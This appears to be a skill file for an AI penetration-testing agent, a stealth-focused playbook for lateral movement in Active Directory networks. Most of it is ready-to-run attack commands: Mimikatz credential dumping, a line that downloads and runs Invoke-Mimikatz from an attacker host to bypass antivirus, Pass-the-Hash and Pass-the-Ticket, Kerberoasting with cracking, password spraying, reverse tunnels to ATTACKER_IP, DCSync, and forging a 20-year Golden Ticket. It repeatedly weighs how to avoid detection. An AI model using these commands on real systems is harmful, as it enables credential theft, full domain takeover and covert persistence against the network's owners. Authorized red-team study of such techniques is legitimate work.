---
name: red-lateral
description: "Red team lateral movement — stealth-first. Credential-based movement (Pass-the-Hash, Pass-the-Ticket, token impersonation), network pivoting (tunneling, proxychains), AD attacks (Kerberoasting, DCSync, Golden/Silver Ticket, BloodHound path traversal), living-off-the-land techniques. Every movement decision evaluated for detection risk. Tracks attack path for full kill chain documentation. Triggers: 'lateral movement', 'pivot', 'pass-the-hash', 'pass-the-ticket', 'kerberoasting', 'bloodhound', 'dcsync', 'golden ticket', 'silver ticket', 'network pivot', 'tunnel', 'proxychains'."
version: 3.0.0
phase: ["post-exploitation"]
category: ["exploitation"]
tools: ["netexec", "bloodhound", "impacket", "mimikatz", "chisel", "ligolo-ng", "proxychains"]
tags: ["lateral-movement", "pivot", "pth", "kerberos", "ad", "bloodhound", "dcsync", "tunneling", "living-off-the-land"]
---

# Red Team Lateral Movement — Stealth-First Kill Chain

## OBJECTIVE

Expand access from initial foothold to target assets via the minimum necessary movement path. Every hop is a decision — weigh intelligence value against detection risk. Document every step as a reproducible attack chain.

**Movement philosophy:**
- Move with purpose — know the target before moving
- Use legitimate credentials and protocols where possible
- Living-off-the-land over dropping tools
- One action at a time — verify before proceeding
- Clean up artifacts where operationally viable

---

## PREREQUISITES

- [ ] Initial foothold established with stable access
- [ ] Network topology partially understood
- [ ] Target assets identified (domain controllers, file servers, dev systems, databases)
- [ ] Credential material available (hashes, tickets, plaintext, or service accounts)
- [ ] Detection risk assessed — is blue team active? SIEM present?
- [ ] Movement explicitly authorized in RoE
- [ ] Pivot infrastructure ready (C2, tunnels, or LOL-based)

```bash
# Foothold situational awareness
hostname && whoami && id
ip addr; ip route; cat /etc/hosts  # Linux
ipconfig /all; route print; type C:\Windows\System32\drivers\etc\hosts  # Windows
```

---

## DECISION LOGIC

```
Before every movement action:

  QUESTION:     What asset am I trying to reach and why?
  PATH:         What is the least-hop, least-noise path to that asset?
  CREDENTIAL:   What credential material do I have? What works here?
  DETECTION:    What does this action look like in logs? Is it normal?
  ALTERNATIVES: Is there a less noisy way to achieve the same goal?
  REVERSIBLE:   Can I undo artifacts left by this action?

Movement priority (lowest detection risk first):

  1. Credential reuse with valid accounts (looks like legitimate access)
  2. Pass-the-Hash / Pass-the-Ticket (no password needed, hard to distinguish)
  3. Kerberos abuse (Kerberoasting, AS-REP roasting) — offline, no noise
  4. WMI/PSExec/SCM with credentials (moderate logging)
  5. BloodHound shortest path exploitation (targeted, documented)
  6. DCSync (high value, high detection risk — save for endgame)
  7. Golden/Silver Ticket (highest stealth after domain compromise)
```

**Detection risk framework:**

| Action | Detection Risk | Typical Log Source |
|--------|---------------|-------------------|
| SMB authentication with valid creds | Low | Security Event 4624 |
| Pass-the-Hash (NTLM) | Low-Medium | Event 4624 type 3 |
| Pass-the-Ticket (Kerberos) | Low | Event 4768/4769 |
| Kerberoasting | Low (offline) | Event 4769 rc4-hmac |
| WMI exec | Medium | WMI activity logs |
| PSExec | High | Service install + 4697 |
| DCSync | High | Event 4662 replication |
| Golden Ticket | Low (after creation) | Anomalous TGT lifetime |

---

## TOOLS

| Tool | WHY | WHEN | STEALTH | WHAT IT ENABLES |
|------|-----|------|---------|-----------------|
| `netexec` (nxc) | Swiss-army lateral movement — SMB/WMI/LDAP/RDP | Credential testing and exec | Medium | Shell on any accessible host |
| `BloodHound` | Attack path visualization in AD | After domain user obtained | Low (collection) | Shortest path to DA |
| `impacket` suite | Kerberos attacks, DCSync, secretsdump | Credential extraction | Medium | Hash extraction, Kerberos tickets |
| `mimikatz` | Credential extraction from memory | Windows with SYSTEM/SeDebugPrivilege | High (AV detected) | NTLM hashes, Kerberos tickets, plaintext |
| `chisel` | TCP tunneling over HTTP | Need to reach non-routable network | Low | Pivot through HTTP ports |
| `ligolo-ng` | Full network tunnel via TUN interface | Complex multi-hop environments | Medium | Transparent network routing |
| `proxychains` | Route tools through SOCKS proxy | After tunnel established | Depends on underlying tunnel | Use any tool through pivot |
| `Rubeus` | Kerberos ticket manipulation | Windows AD environment | Low-Medium | AS-REP roast, Kerberoast, ticket forging |

---

## PHASE 1: NETWORK MAPPING FROM FOOTHOLD

```bash
# Internal network discovery — stay quiet
# Linux: avoid nmap broadcasts, use ICMP + specific ports
for ip in $(seq 1 254); do
  ping -c 1 -W 1 10.0.0.$ip &>/dev/null && echo "10.0.0.$ip ALIVE" &
done
wait

# ARP table — reveals recently communicated hosts
arp -a

# DNS resolution of common internal names
for name in dc dc01 dc1 ldap kerberos fileserver fs01 exchange mail vpn; do
  host $name.DOMAIN.local 2>/dev/null | grep "has address"
done

# Windows: use net commands (LOL)
net view /domain
net group "Domain Controllers" /domain
net user /domain | head -30
```

---

## PHASE 2: CREDENTIAL MATERIAL COLLECTION

### Linux credential hunting
```bash
# Memory — if running as root
strings /proc/*/environ 2>/dev/null | grep -iE "pass|secret|token|key" | head -20

# Config files
find /home /var /opt /etc -name "*.conf" -o -name "*.env" -o -name "*.cfg" 2>/dev/null | \
  xargs grep -l "password\|passwd\|secret" 2>/dev/null | head -10

# SSH keys (pivot gold)
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Kerberos tickets (if AD-joined Linux)
klist 2>/dev/null
ls /tmp/krb5cc_*
```

### Windows credential harvesting
```powershell
# Mimikatz (if AV allows)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"
.\mimikatz.exe "lsadump::sam" "exit"

# Safer: Invoke-Mimikatz (reflective loading, AV bypass)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Registry SAM dump (no Mimikatz needed)
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
reg save HKLM\SAM C:\Windows\Temp\SAM.hive
# Transfer and extract: impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL

# LSA secrets
.\mimikatz.exe "lsadump::secrets" "exit"

# Credential Manager
cmdkey /list
```

---

## PHASE 3: LATERAL MOVEMENT TECHNIQUES

### Pass-the-Hash (NTLM)

```bash
# Test hash against target
netexec smb TARGET_IP -u Administrator -H NTLM_HASH --local-auth

# Execute command via PTH
netexec smb TARGET_IP -u Administrator -H NTLM_HASH --local-auth -x "whoami"

# Shell via PTH
impacket-psexec Administrator@TARGET_IP -hashes :NTLM_HASH
impacket-wmiexec Administrator@TARGET_IP -hashes :NTLM_HASH

# Verify: does output show different hostname?
```

### Pass-the-Ticket (Kerberos)

```bash
# Export ticket (Windows)
# .\mimikatz.exe "kerberos::list /export" "exit"
# or Rubeus: .\Rubeus.exe dump /nowrap

# Import ticket on attacker (Linux)
export KRB5CCNAME=/tmp/ticket.ccache
impacket-psexec -k -no-pass TARGET.DOMAIN.LOCAL

# Verify movement
klist
```

### Kerberoasting (Offline — Zero Network Noise)

```bash
# Request service tickets for SPNs (low noise — normal Kerberos behavior)
impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request \
  -outputfile kerberoast_hashes.txt

# Windows: Rubeus
.\Rubeus.exe kerberoast /outfile:kerberoast.txt /nowrap

# Crack offline — no further network noise
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule
```

### AS-REP Roasting (Accounts Without Pre-Auth)

```bash
# No credentials needed — pure passive
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat \
  -outputfile asrep_hashes.txt -dc-ip DC_IP 2>/dev/null

hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### BloodHound — Attack Path Discovery

```bash
# Collection (Python — from Linux with domain creds)
bloodhound-python -u USER -p PASSWORD -d DOMAIN.LOCAL \
  -dc DC_IP --zip -c All 2>/dev/null

# Collection (SharpHound — from Windows)
.\SharpHound.exe -c All --zipfilename bh_data.zip

# Import to BloodHound and query:
# "Shortest path to Domain Admins from owned principals"
# "Find principals with DCSync rights"
# "Find Kerberoastable users in DA path"
```

### Credential Spray (Low Noise — Domain Context)

```bash
# Domain password spray — ONE password attempt to avoid lockout
# First check lockout policy
netexec smb DC_IP -u valid_user -p Password1 -d DOMAIN --pass-pol 2>/dev/null

# Spray with single password (avoid lockout)
netexec smb DC_IP -u users.txt -p 'Password123!' -d DOMAIN \
  --continue-on-success 2>/dev/null | grep -v FAILURE

# Common enterprise passwords to try (one at a time):
# SeasonYear!: Spring2024!, Summer2023!
# Company+Year: Acme2024!, Target2024!
# Welcome1, Password1, Passw0rd
```

---

## PHASE 4: NETWORK PIVOTING

### Chisel (HTTP Tunneling)

```bash
# Attacker machine
chisel server -p 8080 --reverse &

# On pivot host
./chisel client ATTACKER_IP:8080 R:socks

# Route tools through pivot
proxychains nmap -sT -p 80,443,22,445,3389 INTERNAL_TARGET
proxychains netexec smb INTERNAL_TARGET -u user -p pass
```

### Ligolo-ng (Transparent Tunneling)

```bash
# Attacker: start proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# On pivot host
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Attacker: configure interface
# session → select session → start
# ip route add 10.0.0.0/24 dev ligolo
# Now access 10.0.0.0/24 directly — no proxychains needed
```

### SSH Dynamic Port Forward

```bash
# If SSH available on pivot host
ssh -D 1080 -f -N user@PIVOT_IP
export SOCKS_PROXY=socks5://127.0.0.1:1080
proxychains curl http://INTERNAL_TARGET
```

---

## PHASE 5: DOMAIN DOMINANCE

### DCSync (Credential Extraction from DC)

```bash
# Requires: Replication privileges (Domain Admin, specific ACL)
# Detection: High — generates event 4662 on DC

# Impacket
impacket-secretsdump DOMAIN/DA_USER:PASSWORD@DC_IP -just-dc

# Mimikatz
.\mimikatz.exe "lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv" "exit"

# Extract krbtgt hash for Golden Ticket
.\mimikatz.exe "lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt" "exit"
```

### Golden Ticket (Domain Persistence)

```bash
# After obtaining: domain SID + krbtgt NTLM hash
# Detection: Low after creation — appears as normal Kerberos traffic

# Create Golden Ticket (20-year lifetime)
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:500 /ptt" "exit"

# Linux
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN.LOCAL Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass DC.DOMAIN.LOCAL
```

---

## ATTACK PATH DOCUMENTATION

After each successful hop:

```
pentest_pivot(
  session_id: <session>,
  type: "lateral_movement",
  from: "<source_host>/<user>",
  to: "<dest_host>/<user>",
  method: "<technique: PTH|PTT|Kerberoast|BloodHound_path|...>",
  credential: "<what credential enabled this>",
  evidence: "<proof: command + output>",
  detection_risk: "low|medium|high"
)
```

Update living attack model after each hop:
```
pentest_target_model_update(
  session_id: <session>,
  tool_output: "<new systems reached, credentials obtained>",
  tool_name: "red-lateral"
)
```

---

## EXPECTED OBSERVATIONS

| Observation | Interpretation | Action |
|---|---|---|
| Hash reuse across multiple hosts | Credential overlap | Test on all accessible hosts |
| Service account with SPN | Kerberoasting candidate | Request and crack ticket |
| BloodHound shows path via GenericAll/WriteDACL | ACL abuse path | Follow bloodhound chain |
| User in Domain Admins | Direct DA access | DCSync immediately |
| DC accessible from pivot | Potential domain compromise | BloodHound + DCSync |
| AS-REP roastable accounts | Offline crackable credentials | GetNPUsers + hashcat |
| Writable GPO found | GPO abuse for domain-wide exec | Modify GPO to run payload |

---

## FAILURE MODES

| Failure | Root Cause | Response |
|---|---|---|
| PTH fails with access denied | Local admin disabled or LAPS | Try other accounts; check BloodHound for alternates |
| Kerberoast hashes won't crack | Strong service account passwords | Try longer wordlist + rules; deprioritize |
| BloodHound shows no path | Insufficient collection or hardened AD | Re-run collection with different user; check manual ACL paths |
| All pivots blocked by firewall | Egress filtering | Try HTTP-based tunnels (chisel); check allowed ports |
| Mimikatz blocked by AV | EDR detection | Use Invoke-Mimikatz, Nanodump, or LSASS dump + offline extraction |
| DCSync blocked | Not enough privileges | Find alternate replication rights holder; try via BloodHound |
| Credential spray locks accounts | Aggressive lockout policy | STOP immediately — document lockout threshold and avoid further sprays |

---

## STOP CONDITIONS

- Domain Admin / krbtgt hash obtained — maximum AD compromise achieved
- All paths to target assets exhausted
- Detection indicators observed (alerts, account lockouts, unusual monitoring) — **stop and assess**
- RoE boundary reached — document furthest point of access
- Scope asset reached — extract proof and document chain

---

## REPORTING

Full kill chain documentation:

```json
{
  "attack_chain": [
    {
      "hop": 1,
      "from": "WORKSTATION01/jsmith",
      "to": "FILESERVER01/Administrator",
      "technique": "Pass-the-Hash",
      "credential": "NTLM hash of jsmith local admin",
      "command": "impacket-psexec Administrator@FILESERVER01 -hashes :HASH",
      "evidence": "hostname: FILESERVER01, whoami: NT AUTHORITY\\SYSTEM"
    },
    {
      "hop": 2,
      "from": "FILESERVER01/SYSTEM",
      "to": "DC01/krbtgt",
      "technique": "DCSync",
      "credential": "Domain Admin obtained from FILESERVER01 memory",
      "command": "impacket-secretsdump DOMAIN/DA@DC01 -just-dc",
      "evidence": "krbtgt:HASH extracted"
    }
  ],
  "total_hops": 2,
  "initial_access": "WORKSTATION01 via SQL injection RCE",
  "final_access": "Full domain compromise — krbtgt hash",
  "dwell_time": "~4 hours",
  "detection_events": "None observed",
  "persistence": "Golden Ticket created, valid 20 years",
  "business_impact": "Complete Active Directory compromise — all domain systems accessible"
}
```
